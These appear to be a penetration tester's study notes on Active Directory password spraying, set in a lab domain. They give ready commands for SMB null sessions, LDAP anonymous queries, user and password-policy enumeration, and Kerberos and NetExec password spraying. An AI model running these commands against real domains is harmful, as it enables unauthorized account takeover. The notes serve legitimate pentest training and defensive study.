**Overview:**
- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
- Password spraying involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. 
- To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist
- The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

|Policy|Default Value|
|---|---|
|Enforce password history|24 days|
|Maximum password age|42 days|
|Minimum password age|1 day|
|Minimum password length|7|
|Password must meet complexity requirements|Enabled|
|Store passwords using reversible encryption|Disabled|
|Account lockout duration|Not set|
|Account lockout threshold|0|
|Reset account lockout counter after|Not set|

---
## SMB Null Sessions

**Linux**

```
rpcclient -U "" -N 172.16.5.5
```

Connects via anonymous login to discover domain information through SMB null sessions.

```
querydominfo
```
Obtaining the Password Policy using rpcclient

**windows**

```
net use \\DC01\ipc$ "" /u:""
```


---
## User Enumeration

```
enum4linux -U 172.16.5.5 | grep "user:"
```

Enumerates user accounts, filtered through `grep` to show only users.

```
nxc smb 172.16.5.5 --users
```

Discovers users in the domain via NetExec.

---
## Password Policy

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests

```
enum4linux -P 172.16.5.5
```

Enumerates the password policy on a target Windows domain.

```
nxc smb 172.16.5.5 -u <user> -p <password> --pass-pol
```

Enumerates the password policy using NetExec with valid credentials. `--pass-pol` retrieves policy.

```
net accounts
```
If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc

---
## Password Spraying

```
kerbrute passwordspray -d <domain> --dc 172.16.5.5 valid_users.txt <password>
```

Sprays a single password against a list of valid users via Kerberos. `-d` domain, `--dc` DC IP. 

```
sudo nxc smb 172.16.5.5 -u valid_users.txt -p <password> | grep +
```

Same attack via NetExec from a Linux host. `grep +` filters out failed logons.